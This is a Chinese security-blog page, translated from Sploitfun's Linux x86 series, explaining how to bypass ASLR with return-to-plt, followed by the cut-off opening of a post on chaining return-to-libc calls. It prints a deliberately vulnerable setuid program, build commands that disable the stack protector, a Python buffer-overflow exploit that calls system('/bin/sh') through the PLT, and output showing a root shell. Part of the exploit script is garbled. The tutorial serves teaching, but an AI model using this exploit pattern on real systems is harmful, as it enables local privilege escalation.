<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Index of Computer System and Security</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
    <meta name="keywords" content="computer system, computer security" />
  
  
  
  
  <meta name="description" content="FROM 0 TO 1">
<meta property="og:type" content="website">
<meta property="og:title" content="Index of Computer System and Security">
<meta property="og:url" content="http://yoursite.com/page/6/index.html">
<meta property="og:site_name" content="Index of Computer System and Security">
<meta property="og:description" content="FROM 0 TO 1">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Index of Computer System and Security">
<meta name="twitter:description" content="FROM 0 TO 1">
  
    <link rel="alternate" href="/atom.xml" title="Index of Computer System and Security" type="application/atom+xml">
  
  <link rel="icon" href="/css/images/favicon.ico">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
    
  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >
  <link rel="stylesheet" href="/css/hiero.css" >
  <link rel="stylesheet" href="/css/glyphs.css" >

</head>

<body>
  <header id="allheader" class="site-header" role="banner">
  <div class="clearfix container">
      <div class="site-branding">

          <h1 class="site-title">
            <a href="/" title="Index of Computer System and Security" rel="home">
              Index of Computer System and Security</a>
          </h1>
          <div class="site-description">FROM 0 TO 1</div>

            
          <nav id="main-navigation" class="main-navigation" role="navigation">
            <a class="nav-open">Menu</a>
            <a class="nav-close">Close</a>
            <div class="clearfix sf-menu">

              <ul id="main-nav" class="nmenu sf-js-enabled">
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">首页</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/syssec">系统安全</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/architecture">体系结构</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/virtualization">虚拟化</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/malware">恶意代码</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/conferences">主流会议</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/academy">学术专家</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/celebrity">工业大咖</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/contribution">本站达人</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/donation">打赏支持</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">关于</a> </li>
                    
              </ul>
            </div>
          </nav>


      </div>
  </div>
</header>




  <div id="container">
    <div id="wrap">
            
      <div id="content" class="outer">
        
          <section id="main">
  
    <article id="post-bypassaslr-returntoplt"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170101/bypassaslr-returntoplt/">绕过ASLR-第一篇章(return-to-plt)</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170101/bypassaslr-returntoplt/" class="article-date">
	  <time datetime="2017-01-01T03:40:21.000Z" itemprop="datePublished">一月 1, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt" target="_blank" rel="external">Linux(X86)漏洞利用系列-绕过ASLR-第一篇章(return-to-plt)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<blockquote>
<ul>
<li>0x01 ASLR</li>
<li>0x02 Return-to-plt</li>
<li>0x03 调用‘function@PLT’</li>
</ul>
</blockquote>
<p><u>阅读基础</u>:<br>    <a href="http://www.csyssec.org/20161230/stackbufferflow" target="_blank" rel="external">经典栈缓冲区溢出</a><br><u>VM Setup</u>: Ubuntu 12.04(x86)</p>
<p>在前面的文章中，为了利用漏洞代码，攻击者需要知道：</p>
<ul>
<li>栈地址（为了跳转到shellcode中)</li>
<li>libc基地址(为了成功绕过NX)</li>
</ul>
<p>因此，为了防御攻击者的行为，安全研究人员提出一种漏洞利用缓解(exploit mitigation)方法: “ASLR”</p>
<h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p>地址空间布局随机化(ASLR)是一种漏洞利用缓解方法，其可以随机化</p>
<ul>
<li>栈地址</li>
<li>堆地址</li>
<li>共享库地址</li>
</ul>
<p>上述地址一旦被随机化，尤其是当共享库地址被随机化时，由于攻击者需要知道libc的基地址，我们前面提到的绕过NX的方法不再有效。但这种缓解技术也不是完全安全的。</p>
<p>从<a href="">前文</a>中，我们已经知道exp.py中的 libc函数地址是以下面计算方式得到的：</p>
<pre><code>libc函数地址=libc基地址+函数偏移
</code></pre><p>这里</p>
<ul>
<li>由于随机化被关闭，libc基地址是个常量(在‘vuln’二进制文件中是0xb7e22000)</li>
<li>函数偏移也是常量(可以执行”readelf -s libc.so.6 | grep”获取)</li>
</ul>
<p>现在当我们利用以下命令打开全随机化选项时(full randomization)</p>
<pre><code>#echo 2 &gt; /proc/sys/kernel/randomize_va_space
</code></pre><p>libc基地址将会被随机化</p>
<p><u>注意</u>： 只有libc的基地址被随机化了，从基地址开始的一个特殊函数的偏移仍然是个常量！因此，尽管打开了ASLR,只要我们能利用下面三项技术绕过共享库基地址的随机化，漏洞程序仍然能被成功利用.</p>
<ul>
<li>Return-to-plt（<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt" target="_blank" rel="external">这篇文章</a>）</li>
<li>暴力破解(<a href="http://www.csyssec.org/20170101/bypassaslr-bruteforce" target="_blank" rel="external">第二篇章</a>)</li>
<li>GOT覆盖与GOR解引用(<a href="http://www.csyssec.org/20170101/bypassaslr-gotgor" target="_blank" rel="external">第三篇章</a>)</li>
</ul>
<h3 id="Return-to-plt"><a href="#Return-to-plt" class="headerlink" title="Return-to-plt"></a>Return-to-plt</h3><p>利用这项技术，攻击者返回到一个函数的PLT(其地址没有被随机化-在执行之前就可以知道)，而不是返回到libc函数(其地址被随机化了)。 由于’function@PLT’没有被随机化，攻击者不需要预测libc的基地址，而只要简单地返回到‘function@PLT’就可以调用这个’function’。</p>
<pre><code>什么是PLT,如何调用‘function@PLT&apos;来调用其中的&apos;function&apos;
</code></pre><h3 id="调用‘function-PLT’"><a href="#调用‘function-PLT’" class="headerlink" title="调用‘function@PLT’"></a>调用‘function@PLT’</h3><p>要了解过程链接表（Procedural Linkage Table(PLT)）,先来简单介绍一下共享库！</p>
<p>不同于静态库的是，共享库的text段在多个进程间共享，但它的数据段在每个进程中是唯一的。这样设计可以减少内存和磁盘空间。正是text段在多个进程间共享，其必须只有读和执行权限。没有了写权限，动态链接器不能在text段内部重定位数据描述符(data symbol)或者函数地址。这样一来，程序运行期间，动态链接器是如何在不修改text段的情况下，重定位共享库描述符的呢? 利用PIC!</p>
<pre><code>什么是PIC呢？
</code></pre><p>位置独立代码(Position Independent Code(PIC))用来解决这个问题： 尽管共享库的text段在加载期间执行重定为，也能确保它能在多个进程中共享。PIC通过一层间接寻址来达到这个目的。共享库的text段中没有绝对虚拟地址来替代全局描述符和函数引用，而是指向数据段中的一个特定表。这个表用来存放全局描述符和函数的绝对虚拟地址。动态链接器作为重定位的一部分会填充这个表。因此，在重定位时，只有数据段被修改，而text段依然完好无顺。</p>
<p>动态链接器使用下面两种方法来重定位PIC中的全局描述符和函数：</p>
<ul>
<li><u>全局偏移表(Global Offset Table(GOT))</u>: 全局偏移表为每个全局变量分配一个4字节的表项，这4个字表项中含有全局变量的地址。当代码段中的一条指令引用一个全局变量时，这条指令指向的是GOT中的一个表项，而不是全局变量的绝对虚拟地址。当共享库被加载时，动态链接库会重定位这个GOT表项。因此，PIC利用GOT通过一层间接寻址来重定位全局描述符.</li>
<li><u>过程链接表(Procedural Linkage Table(PLT)): 过程链接表含有每个全局函数的存根代码。text段中的一条call指令不会直接调用这个函数(‘function’)，而是调用这个存根代码(function@PLT)。存根代码在动态链接器的帮助下，解析函数地址并将其拷贝到GOT(GOT[n])中。解析过程只发生在第一次调用函数(‘function’)的时候,之后代码段中的call指令调用存根代码(function@PLT)而不是调用动态链接器去解析函数地址(‘function’)。存根代码直接从GOT(GOT[n])获取函数地址并跳转到那里。因此，PIC利用PLT通过两层间接寻址来重定位函数地址</u></li>
</ul>
<p>很高兴你知道了PIC并能理解它能保证共享库的text段的完整性，因此能帮助共享库的text段再许多进程间共享！ 但你是否怀疑过，为什么可执行文件的text段并不在任何进程间共享，也需要有个GOT表项或者PLT存根代码呢？这是出于安全保护机制的考虑。如今默认情况下，text段只提供读和执行权限并没有写权限(R_X)。这种保护机制并允许动态链接库对text段进行写操作，因此也就不能重定位text段内部的数据描述符或函数地址。为了让动态链接器能重定位，可执行文件同共享库一样也需要GOT表项和PLT存根代码。</p>
<p><u>代码样例</u>：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//eg.c</span></div><div class="line"><span class="comment">//$gcc -g -o eg eg.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, argv[<span class="number">1</span>]);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>下面的汇编代码说明了’printf’并不是直接被调用，而是其相应的PLT代码 ‘printf@PLT’被调用了。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble main</div><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line"> <span class="number">0x080483e4</span> &lt;+<span class="number">0</span>&gt;: push %ebp</div><div class="line"> <span class="number">0x080483e5</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp</div><div class="line"> <span class="number">0x080483e7</span> &lt;+<span class="number">3</span>&gt;: and $<span class="number">0xfffffff0</span>,%esp</div><div class="line"> <span class="number">0x080483ea</span> &lt;+<span class="number">6</span>&gt;: sub $<span class="number">0x10</span>,%esp</div><div class="line"> <span class="number">0x080483ed</span> &lt;+<span class="number">9</span>&gt;: mov <span class="number">0xc</span>(%ebp),%eax</div><div class="line"> <span class="number">0x080483f0</span> &lt;+<span class="number">12</span>&gt;: add $<span class="number">0x4</span>,%eax</div><div class="line"> <span class="number">0x080483f3</span> &lt;+<span class="number">15</span>&gt;: mov (%eax),%edx</div><div class="line"> <span class="number">0x080483f5</span> &lt;+<span class="number">17</span>&gt;: mov $<span class="number">0x80484e0</span>,%eax</div><div class="line"> <span class="number">0x080483fa</span> &lt;+<span class="number">22</span>&gt;: mov %edx,<span class="number">0x4</span>(%esp)</div><div class="line"> <span class="number">0x080483fe</span> &lt;+<span class="number">26</span>&gt;: mov %eax,(%esp)</div><div class="line"> <span class="number">0x08048401</span> &lt;+<span class="number">29</span>&gt;: call <span class="number">0x8048300</span> &lt;<span class="built_in">printf</span>@plt&gt;</div><div class="line"> <span class="number">0x08048406</span> &lt;+<span class="number">34</span>&gt;: mov $<span class="number">0x0</span>,%eax</div><div class="line"> <span class="number">0x0804840b</span> &lt;+<span class="number">39</span>&gt;: leave </div><div class="line"> <span class="number">0x0804840c</span> &lt;+<span class="number">40</span>&gt;: ret </div><div class="line">End of assembler dump.</div><div class="line">(gdb) disassemble <span class="number">0x8048300</span></div><div class="line">Dump of assembler code <span class="keyword">for</span> function <span class="built_in">printf</span>@plt:</div><div class="line"> <span class="number">0x08048300</span> &lt;+<span class="number">0</span>&gt;: jmp *<span class="number">0x804a000</span></div><div class="line"> <span class="number">0x08048306</span> &lt;+<span class="number">6</span>&gt;: push $<span class="number">0x0</span></div><div class="line"> <span class="number">0x0804830b</span> &lt;+<span class="number">11</span>&gt;: jmp <span class="number">0x80482f0</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p>在’printf’第一次被调用前，其相应的GOT表项(0x804a000)指回到PLT代码(0x8048306)本身。因此，当printf函数第一次被调用时，其相应的函数地址通过动态链接器来解析。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(gdb) x/<span class="number">1</span>xw <span class="number">0x804a000</span></div><div class="line"><span class="number">0x804a000</span> &lt;<span class="built_in">printf</span>@got.plt&gt;: <span class="number">0x08048306</span></div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p>现在printf被调用之后，其相应的GOT表项含有printf的函数地址(如下图):</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(gdb) x/<span class="number">1</span>xw <span class="number">0x804a000</span></div><div class="line"><span class="number">0x804a000</span> &lt;<span class="built_in">printf</span>@got.plt&gt;: <span class="number">0xb7e6e850</span></div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p><u>注意 1</u>: 如果你想了解PLT和GOT的更多信息，可以阅读<a href="">这篇</a>文章</p>
<p><u>注意 2</u>: 我会在别的文中单独谈谈动态链接器是如何解析libc函数地址的。现在只要记住下面两条语句(printf@PLT的一部分）是用来解析函数地址的！</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">0x08048306</span> &lt;+<span class="number">6</span>&gt;: push $<span class="number">0x0</span></div><div class="line"><span class="number">0x0804830b</span> &lt;+<span class="number">11</span>&gt;: jmp <span class="number">0x80482f0</span></div></pre></td></tr></table></figure>
<p>了解这个之后，我们可以知道攻击者并不需要知道libc函数的地址来调用libc函数，只要简单通过’function@PLT’（在执行前知道）就可以调用了。</p>
<p><u>漏洞代码</u>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">/* Eventhough shell() function isnt invoked directly, its needed here since 'system@PLT' and 'exit@PLT' stub code should be present in executable to successfully exploit it. */</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</div><div class="line"> system(<span class="string">"/bin/sh"</span>);</div><div class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><u>编译命令</u>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
<p>现在反汇编可执行文件’vuln’,我们可以找出’system@PLT’与’exit@PLT’的地址</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble shell</div><div class="line">Dump of assembler code <span class="keyword">for</span> function shell:</div><div class="line"> <span class="number">0x08048474</span> &lt;+<span class="number">0</span>&gt;: push %ebp</div><div class="line"> <span class="number">0x08048475</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp</div><div class="line"> <span class="number">0x08048477</span> &lt;+<span class="number">3</span>&gt;: sub $<span class="number">0x18</span>,%esp</div><div class="line"> <span class="number">0x0804847a</span> &lt;+<span class="number">6</span>&gt;: movl $<span class="number">0x80485a0</span>,(%esp)</div><div class="line"> <span class="number">0x08048481</span> &lt;+<span class="number">13</span>&gt;: call <span class="number">0x8048380</span> &lt;system@plt&gt;</div><div class="line"> <span class="number">0x08048486</span> &lt;+<span class="number">18</span>&gt;: movl $<span class="number">0x0</span>,(%esp)</div><div class="line"> <span class="number">0x0804848d</span> &lt;+<span class="number">25</span>&gt;: call <span class="number">0x80483a0</span> &lt;<span class="built_in">exit</span>@plt&gt;</div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p>利用这些地址，我们就可以写出绕过ASLR(与NX)的漏洞利用代码！</p>
<p><u>漏洞利用代码</u>：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">#exp.py</div><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">system = 0x8048380</div><div class="line">exit = 0x80483a0</div><div class="line">system_arg = 0x80485b5     #Obtained from hexdump output of executable 'vuln'</div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> return struct.pack("&lt;I",numystem + exit + system_arg</div><div class="line">buf = "A" * 272</div><div class="line">buf += conv(system)</div><div class="line">buf += conv(exit)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line">print "Calling vulnerable program"</div><div class="line">call(["./vuln", buf])</div></pre></td></tr></table></figure>
<p>执行上述程序就可以获取root shell，如下所示：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA������</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
<p><u>注意</u>： 为了获取这个root shell，可执行文件必须包含’system@PLT’与’exit@PLT’代码。在<a href="http://www.csyssec.org/20170101/bypassaslr-gotgor" target="_blank" rel="external">第三篇</a>中，我会谈谈利用GOT覆盖与GOT解引用技术，在可执行文件中并没有需要的PLT存根代码并且系统已经打开了ASLR的情况下，攻击者如何调用libc函数。 </p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt" target="_blank" rel="external">Linux(X86)漏洞利用系列-绕过ASLR-第一篇章(return-to-plt)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ASLR/">ASLR</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-chainingreturntolibc"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170101/chainingreturntolibc/">Return-to-libc链接绕过NX</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170101/chainingreturntolibc/" class="article-date">
	  <time datetime="2017-01-01T02:39:58.000Z" itemprop="datePublished">一月 1, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/chainingreturntolibc" target="_blank" rel="external">Linux(X86)漏洞利用系列-Return-to-libc链接绕过NX</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<blockquote>
<ul>
<li>0x01 什么Return-to-libc链接</li>
<li>0x02 什么是帧欺骗</li>
<li>0x03 leave ret指令是如何调用其上方libc函数的</li>
</ul>
</blockquote>
<p><u>阅读基础</u>:</p>
<ul>
<li>1.<a href="http://www.csyssec.org/20161230/stackbufferflow/" target="_blank" rel="external">经典栈缓冲区溢出</a></li>
<li>2.<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">Return-to-libc绕过NX</a></li>
</ul>
<p><u>VM Setup</u>: Ubuntu 12.04(x86)</p>
<h3 id="什么是Return-to-libc链接"><a href="#什么是Return-to-libc链接" class="headerlink" title="什么是Return-to-libc链接"></a>什么是Return-to-libc链接</h3><p>在<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">前文</a>中可以看出，攻击者需要调用多个libc函数才能成功利用漏洞。一种链接libc函数的简单方法就是将不同libc函数依次放在栈中。但由于函数参数的原因，这是不可能的。现在你可能还不明白，没关系，继续往下读就好。</p>
<p><u>漏洞代码</u>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> seteuid(getuid()); <span class="comment">/* Temporarily drop privileges */</span></div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</div><div class="line"> fflush(<span class="built_in">stdout</span>);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><u>注意</u>: 上述代码和<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">前文</a>中的(vuln_priv.c)一样。</p>
<p><u>编译命令</u>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -fno-<span class="built_in">stack</span>-protector -g -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
<p>正如<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">前文</a>所说，链接seteuid,system和exit函数能允许我们利用漏洞代码”vuln”。但并没有这么简单直接，主要在于下面这两个问题：</p>
<ul>
<li>1.攻击者需要将两个libc函数参数或者其中一个libc函数参数与另一个libc函数地址放在栈的同一位置。显然这是不可能的(如下图所示)</li>
